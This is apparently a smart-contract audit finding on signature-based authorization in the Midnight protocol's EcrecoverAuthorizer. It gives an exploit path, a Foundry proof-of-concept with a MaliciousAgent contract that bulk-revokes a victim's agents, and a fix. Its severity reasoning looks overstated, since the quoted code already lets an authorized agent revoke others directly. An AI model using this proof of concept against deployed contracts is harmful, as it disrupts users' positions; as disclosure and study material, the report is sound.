### Title
Authorized agent can use EcrecoverAuthorizer to authorize a malicious contract that bulk-deauthorizes all victim agents - (File: src/periphery/EcrecoverAuthorizer.sol)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` accepts a signature from any address that is already authorized by the `authorization.authorizer` on Midnight, not only from the authorizer themselves. Because `Midnight.setIsAuthorized` also permits any authorized agent to modify the authorizer's `isAuthorized` mapping, an attacker who holds a single authorization from the victim can sign a new authorization granting a malicious contract agent status, and that contract can then strip every other agent the victim has registered in one atomic sequence of calls.

### Finding Description

**Root cause — `EcrecoverAuthorizer.setIsAuthorized` line 34:**

```solidity
require(
    signer == authorization.authorizer
        || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);
```

Any address that satisfies `isAuthorized[victim][signer]` can produce a valid signature for an `Authorization` struct whose `authorizer` field is `victim`. There is no restriction on what `authorized` may be — it can be an arbitrary contract. [1](#0-0) 

**Downstream — `Midnight.setIsAuthorized` line 732:**

```solidity
require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
isAuthorized[onBehalf][authorized] = newIsAuthorized;
```

Once a contract address appears in `isAuthorized[victim][contract] = true`, that contract can call `setIsAuthorized` with any `authorized` address and any `newIsAuthorized` value on behalf of `victim`. There is no restriction preventing an authorized agent from deauthorizing other agents. [2](#0-1) 

**Exact exploit path:**

Preconditions:
- `isAuthorized[victim][EcrecoverAuthorizer] = true` (victim opted into signature-based authorization — the standard setup shown in every test)
- `isAuthorized[victim][attacker] = true` (victim previously authorized the attacker EOA for any purpose)

Steps (all executable inside one transaction via a wrapper contract):

1. Attacker deploys `MaliciousAgent` with a `deauthorizeAll(address victim, address[] agents)` function that loops over `Midnight.setIsAuthorized(agents[i], false, victim)`.
2. Attacker signs `Authorization{authorizer: victim, authorized: MaliciousAgent, isAuthorized: true, nonce: N}` with their private key.
3. Wrapper calls `EcrecoverAuthorizer.setIsAuthorized(auth, sig)`:
   - Deadline/nonce checks pass.
   - `ecrecover` returns `attacker`.
   - Line 34 check: `isAuthorized[victim][attacker] == true` → passes.
   - Calls `Midnight.setIsAuthorized(MaliciousAgent, true, victim)`:
     - Line 732: `isAuthorized[victim][EcrecoverAuthorizer] == true` → passes.
     - State: `isAuthorized[victim][MaliciousAgent] = true`.
4. Wrapper calls `MaliciousAgent.deauthorizeAll(victim, [agent1, agent2, …])`:
   - Each inner call: `Midnight.setIsAuthorized(agentN, false, victim)` with `msg.sender = MaliciousAgent`.
   - Line 732: `isAuthorized[victim][MaliciousAgent] == true` → passes.
   - State: `isAuthorized[victim][agentN] = false` for every agent.

After step 4, every agent the victim had registered is deauthorized. The victim's own EOA is unaffected, but any smart-contract wallet, keeper, or protocol integration acting as an agent can no longer call `withdraw`, `repay`, `withdrawCollateral`, `take`, `liquidate`, or `claimFee` on the victim's behalf. [3](#0-2) [4](#0-3) [5](#0-4) 

### Impact Explanation

Every entry point that gates on `isAuthorized[onBehalf][msg.sender]` — `withdraw`, `repay`, `supplyCollateral`, `withdrawCollateral`, `setConsumed`, `setIsAuthorized`, and the taker path of `take` — becomes inaccessible to all of the victim's previously registered agents. If the victim's positions are managed exclusively through agents (e.g., a smart-contract wallet or an automated keeper), the victim loses the ability to repay debt before liquidation, withdraw collateral, or claim fees, constituting a complete operational DoS on their protocol interactions. [4](#0-3) [5](#0-4) [6](#0-5) 

### Likelihood Explanation

Preconditions are realistic and common: any user who has authorized `EcrecoverAuthorizer` (the standard onboarding step shown in `testEcrecoverAuthorizer`) and has at least one other authorized agent is vulnerable. The attacker only needs to have been granted authorization once — even temporarily — for any purpose. The attack is cheap (one `EcrecoverAuthorizer` call + N `setIsAuthorized` calls), atomic, and irreversible until the victim manually re-authorizes their agents. [7](#0-6) 

### Recommendation

Restrict `EcrecoverAuthorizer.setIsAuthorized` to accept only signatures from the `authorization.authorizer` themselves — remove the delegated-signer branch:

```solidity
// Before (line 33-36):
require(
    signer == authorization.authorizer
        || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);

// After:
require(signer == authorization.authorizer, Unauthorized());
```

This ensures that only the authorizer's own key can produce a valid EIP-712 authorization, eliminating the ability of any delegated agent to escalate privileges through `EcrecoverAuthorizer`. If delegated signing is intentionally desired, scope it to a separate, narrowly-permissioned path that explicitly prohibits authorizing new agents. [1](#0-0) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {BaseTest} from "./BaseTest.sol";
import {Authorization, Signature, AUTHORIZATION_TYPEHASH, EIP712_DOMAIN_TYPEHASH}
    from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";

contract MaliciousAgent {
    IMidnight public midnight;
    constructor(address _midnight) { midnight = IMidnight(_midnight); }
    function deauthorizeAll(address victim, address[] calldata agents) external {
        for (uint i = 0; i < agents.length; i++) {
            midnight.setIsAuthorized(agents[i], false, victim);
        }
    }
}

contract BulkDeauthDoSTest is BaseTest {
    function testBulkDeauthDoS() public {
        // Setup: victim authorizes EcrecoverAuthorizer and two legitimate agents
        address victim = makeAddr("victim");
        address agent1 = makeAddr("agent1");
        address agent2 = makeAddr("agent2");
        uint256 attackerKey = 0xA11CE;
        address attacker = vm.addr(attackerKey);

        vm.startPrank(victim);
        midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, victim);
        midnight.setIsAuthorized(agent1, true, victim);
        midnight.setIsAuthorized(agent2, true, victim);
        midnight.setIsAuthorized(attacker, true, victim); // victim trusts attacker
        vm.stopPrank();

        // Attacker deploys malicious contract
        MaliciousAgent malAgent = new MaliciousAgent(address(midnight));

        // Attacker signs authorization granting malAgent victim-level access
        Authorization memory auth = Authorization({
            authorizer: victim,
            authorized: address(malAgent),
            isAuthorized: true,
            nonce: ecrecoverAuthorizer.nonce(victim),
            deadline: block.timestamp + 1 days
        });
        bytes32 structHash = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, auth));
        bytes32 domainSep = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH,
            block.chainid, address(ecrecoverAuthorizer)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSep, structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(attackerKey, digest);

        // Single-transaction attack via wrapper
        ecrecoverAuthorizer.setIsAuthorized(auth, Signature(v, r, s));
        address[] memory agents = new address[](2);
        agents[0] = agent1; agents[1] = agent2;
        malAgent.deauthorizeAll(victim, agents);

        // Assertions: all legitimate agents are deauthorized
        assertFalse(midnight.isAuthorized(victim, agent1));
        assertFalse(midnight.isAuthorized(victim, agent2));
        // Victim's positions are now inaccessible to their agents
        vm.prank(agent1);
        vm.expectRevert(IMidnight.Unauthorized.selector);
        midnight.withdraw(market, 1, victim, victim);
    }
}
```

Expected: both `assertFalse` assertions pass and the `withdraw` call reverts with `Unauthorized`, confirming complete DoS on all victim agent interactions. [8](#0-7) [2](#0-1)

### Citations

**File:** src/periphery/EcrecoverAuthorizer.sol (L24-48)
```text
    function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
        require(block.timestamp <= authorization.deadline, Expired());
        require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());

        bytes32 hashStruct = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
        bytes32 domainSeparator = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(this)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, hashStruct));
        address signer = ecrecover(digest, signature.v, signature.r, signature.s);
        require(signer != address(0), InvalidSignature());
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );

        emit SetIsAuthorized(
            msg.sender,
            authorization.authorizer,
            authorization.authorized,
            authorization.isAuthorized,
            authorization.nonce
        );

        IMidnight(MIDNIGHT)
            .setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
    }
```

**File:** src/Midnight.sol (L482-482)
```text
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
```

**File:** src/Midnight.sol (L505-505)
```text
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
```

**File:** src/Midnight.sol (L556-556)
```text
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
```

**File:** src/Midnight.sol (L731-735)
```text
    function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        isAuthorized[onBehalf][authorized] = newIsAuthorized;
        emit EventsLib.SetIsAuthorized(msg.sender, authorized, newIsAuthorized, onBehalf);
    }
```

**File:** test/SetIsAuthorizedWithSigTest.sol (L54-56)
```text
    function testEcrecoverAuthorizer() public {
        vm.prank(borrower);
        midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, borrower);
```
